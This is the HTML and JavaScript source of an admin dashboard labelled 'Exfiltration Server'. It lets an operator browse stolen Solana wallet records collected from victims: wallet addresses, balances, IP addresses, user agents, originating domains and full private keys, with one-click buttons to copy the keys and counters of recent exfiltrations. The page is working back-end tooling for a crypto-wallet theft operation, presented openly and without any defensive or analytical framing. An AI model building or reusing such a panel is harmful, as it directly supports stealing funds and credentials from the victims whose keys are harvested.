<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Exfiltration Admin</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:'Courier New',monospace;background:#0a0a0a;color:#00ff00;padding:20px}
        .container{max-width:1400px;margin:0 auto}
        .header{background:#1a1a1a;padding:20px;border-radius:10px;margin-bottom:20px;border:1px solid #00ff00}
        .stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:20px;margin-bottom:20px}
        .stat-card{background:#1a1a1a;padding:20px;border-radius:10px;border:1px solid #333}
        .stat-value{font-size:32px;font-weight:bold;color:#00ff00;margin-top:10px}
        .login-form{background:#1a1a1a;padding:40px;border-radius:10px;max-width:400px;margin:100px auto;text-align:center}
        input{width:100%;padding:10px;margin:10px 0;background:#2a2a2a;border:1px solid #444;color:#00ff00;font-family:monospace}
        button{background:#00ff00;color:#0a0a0a;padding:10px 20px;border:none;cursor:pointer;font-weight:bold;margin:5px;border-radius:4px}
        button:hover{background:#00cc00}
        .table-wrapper{max-height:600px;overflow-y:auto;border:1px solid #333;border-radius:5px;margin-top:10px}
        table{width:100%;border-collapse:collapse;background:#1a1a1a;font-size:12px}
        th,td{padding:10px 12px;text-align:left;border-bottom:1px solid #333}
        th{background:#2a2a2a;color:#00ff00;position:sticky;top:0;z-index:10}
        .delete-btn{background:#ff0000;color:white;padding:5px 10px;border:none;cursor:pointer;border-radius:3px}
        .copy-btn{background:#0066cc;color:white;padding:3px 8px;margin-left:5px;border:none;border-radius:3px;cursor:pointer;font-size:10px}
        .copy-btn:hover{background:#0052a3}
        .copy-btn.copied{background:#00cc00;color:black}
        .pagination{margin-top:20px;text-align:center}
        .wallet-cell{font-family:monospace;font-size:11px;word-break:break-all}
        .key-cell{font-family:monospace;font-size:10px;word-break:break-all}
        .expand-btn{background:#444;color:#00ff00;padding:2px 8px;border:1px solid #00ff00;border-radius:3px;cursor:pointer;font-size:10px}
        .expand-btn:hover{background:#00ff00;color:#0a0a0a}
        .detail-row{display:none;background:#111}
        .detail-row.show{display:table-row}
        .detail-cell{padding:15px 20px}
        .detail-label{color:#888;font-size:11px;font-weight:bold}
        .detail-value{color:#00ff00;font-family:monospace;font-size:12px;word-break:break-all;background:#0a0a0a;padding:8px;border-radius:4px;margin-top:4px}
        .detail-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}
        .toast{position:fixed;bottom:20px;right:20px;background:#00ff00;color:#0a0a0a;padding:10px 20px;border-radius:5px;font-weight:bold;z-index:1000;animation:slideIn 0.3s ease}
        .toast.error{background:#ff0000;color:white}
        @keyframes slideIn{from{transform:translateX(100%);opacity:0}to{transform:translateX(0);opacity:1}}
        @media(max-width:768px){.detail-grid{grid-template-columns:1fr}}
    </style>
</head>
<body>
<div class="container" id="app">
<div id="loginScreen">
<div class="login-form">
<h2>🔐 Admin Login</h2>
<input type="text" id="username" placeholder="Username">
<input type="password" id="password" placeholder="Password">
<button onclick="login()">Login</button>
</div>
</div>
<div id="dashboard" style="display:none">
<div class="header">
<h1>🚀 Exfiltration Server</h1>
<button onclick="logout()">Logout</button>
<!-- <button onclick="clearAllData()" style="background:#ff0000">Clear All</button> -->
<button onclick="refreshData()">Refresh</button>
</div>
<div class="stats-grid" id="stats"></div>
<div class="table-wrapper">
<table>
<thead>
<tr>
    <th style="width:30px">#</th>
    <th style="min-width:120px">Time</th>
    <th style="min-width:250px">Wallet Address</th>
    <th style="min-width:100px">Balance</th>
    <th style="min-width:120px">User ID</th>
    <th style="min-width:100px">IP</th>
    <!-- <th style="min-width:80px">Action</th> -->
</tr>
</thead>
<tbody id="walletsBody"></tbody>
</table>
</div>
<div class="pagination" id="pagination"></div>
</div>
</div>

<script>
let token=null,currentPage=1;

function showToast(message, isError=false){
    const toast=document.createElement('div');
    toast.className='toast'+(isError?' error':'');
    toast.textContent=message;
    document.body.appendChild(toast);
    setTimeout(()=>toast.remove(),2000);
}

async function copyToClipboard(text, fieldName){
    try{
        await navigator.clipboard.writeText(text);
        showToast(`✅ ${fieldName} copied!`);
        const btn=event.target;
        btn.textContent='Copied!';
        btn.classList.add('copied');
        setTimeout(()=>{btn.textContent='Copy';btn.classList.remove('copied');},1500);
    }catch(err){
        showToast(`❌ Failed to copy`, true);
    }
}

function toggleDetails(id){
    const row=document.getElementById('detail-'+id);
    if(row){
        row.classList.toggle('show');
        const btn=event.target;
        btn.textContent=row.classList.contains('show')?'▲ Hide':'▼ Details';
    }
}

async function login(){
    const u=document.getElementById('username').value;
    const p=document.getElementById('password').value;
    token=btoa(u+':'+p);
    try{
        const r=await fetch('/api/stats',{headers:{'Authorization':'Basic '+token}});
        if(r.ok){
            document.getElementById('loginScreen').style.display='none';
            document.getElementById('dashboard').style.display='block';
            refreshData();
        }else{alert('Invalid credentials');token=null;}
    }catch(e){alert('Login failed');}
}

function logout(){
    token=null;
    document.getElementById('loginScreen').style.display='block';
    document.getElementById('dashboard').style.display='none';
}

async function refreshData(){
    if(!token)return;
    await loadStats();
    await loadWallets();
}

async function loadStats(){
    try{
        const r=await fetch('/api/stats',{headers:{'Authorization':'Basic '+token}});
        const d=await r.json();
        if(d.success){
            document.getElementById('stats').innerHTML=`
                <div class="stat-card"><div>💰 Total Wallets</div><div class="stat-value">${d.stats.totalWallets}</div></div>
                <div class="stat-card"><div>👤 Unique Users</div><div class="stat-value">${d.stats.uniqueUsers}</div></div>
                <div class="stat-card"><div>💎 Total Balance</div><div class="stat-value">${parseFloat(d.stats.totalBalance).toFixed(4)} SOL</div></div>
                <div class="stat-card"><div>📊 Last 24h</div><div class="stat-value">${d.stats.last24hExfiltrations}</div></div>
            `;
        }
    }catch(e){console.error('Stats error:',e);}
}

async function loadWallets(){
    try{
        const r=await fetch('/api/wallets?page='+currentPage,{headers:{'Authorization':'Basic '+token}});
        const d=await r.json();
        if(d.success&&d.data.length){
            document.getElementById('walletsBody').innerHTML=d.data.map((w,idx)=>{
                const rowNum=(currentPage-1)*50+idx+1;
                return `
                <tr>
                    <td>${rowNum}</td>
                    <td style="white-space:nowrap;font-size:11px">${new Date(w.collected_at).toLocaleString()}</td>
                    <td>
                        <div class="wallet-cell">
                            ${w.wallet_address}
                            <button class="copy-btn" onclick="copyToClipboard('${w.wallet_address.replace(/'/g,"\\'")}','Wallet')">Copy</button>
                            <button class="expand-btn" onclick="toggleDetails(${w.id})">▼ Details</button>
                        </div>
                    </td>
                    <td style="white-space:nowrap">${parseFloat(w.balance).toFixed(4)} SOL</td>
                    <td style="font-size:11px;max-width:120px;word-break:break-all">${w.user_id||'N/A'}</td>
                    <td style="font-size:11px">${w.ip_address}</td>
                    
                </tr>
                <tr id="detail-${w.id}" class="detail-row">
                    <td colspan="7">
                        <div class="detail-cell">
                            <div class="detail-grid">
                                <div>
                                    <div class="detail-label">🔑 PRIVATE KEY</div>
                                    <div class="detail-value">${w.private_key}</div>
                                    <button class="copy-btn" onclick="copyToClipboard('${w.private_key.replace(/'/g,"\\'")}','Private Key')" style="margin-top:5px">Copy Private Key</button>
                                </div>
                                <div>
                                    <div class="detail-label">📋 FULL WALLET ADDRESS</div>
                                    <div class="detail-value">${w.wallet_address}</div>
                                    <button class="copy-btn" onclick="copyToClipboard('${w.wallet_address.replace(/'/g,"\\'")}','Wallet Address')" style="margin-top:5px">Copy Address</button>
                                    <div style="margin-top:8px">
                                        <div class="detail-label">🌐 DOMAIN</div>
                                        <div class="detail-value" style="font-size:11px">${w.domain||'N/A'}</div>
                                    </div>
                                    <div style="margin-top:8px">
                                        <div class="detail-label">📱 USER AGENT</div>
                                        <div class="detail-value" style="font-size:10px;word-break:break-all">${w.user_agent||'N/A'}</div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </td>
                </tr>
            `}).join('');
            document.getElementById('pagination').innerHTML=`
                <button onclick="changePage(${currentPage-1})" ${currentPage===1?'disabled':''}>Prev</button>
                Page ${currentPage} of ${d.pagination.pages}
                <button onclick="changePage(${currentPage+1})" ${currentPage===d.pagination.pages?'disabled':''}>Next</button>
            `;
        }else{
            document.getElementById('walletsBody').innerHTML='<tr><td colspan="7">No wallets found</td></tr>';
        }
    }catch(e){console.error('Wallets error:',e);}
}

function changePage(p){
    currentPage=p;
    loadWallets();
}

async function deleteWallet(id){
    if(confirm('Delete this wallet?')){
        await fetch('/api/wallets/'+id,{method:'DELETE',headers:{'Authorization':'Basic '+token}});
        refreshData();
    }
}

async function clearAllData(){
    if(confirm('⚠️ Delete ALL wallet data?')){
        await fetch('/api/clear-all',{method:'DELETE',headers:{'Authorization':'Basic '+token}});
        refreshData();
    }
}
</script>
</body>
</html>
